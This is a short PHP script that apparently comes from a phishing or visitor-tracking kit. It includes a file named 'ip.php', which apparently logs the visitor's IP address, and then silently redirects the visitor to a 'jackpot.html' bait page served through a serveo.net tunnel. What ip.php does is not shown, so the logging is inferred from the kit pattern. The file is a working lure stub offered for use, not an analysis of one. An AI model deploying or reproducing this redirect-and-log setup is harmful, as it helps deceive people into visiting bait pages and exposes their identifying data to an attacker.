<?php
include 'ip.php';
header('Location: https://fenum.serveo.net/jackpot.html');
exit
?>
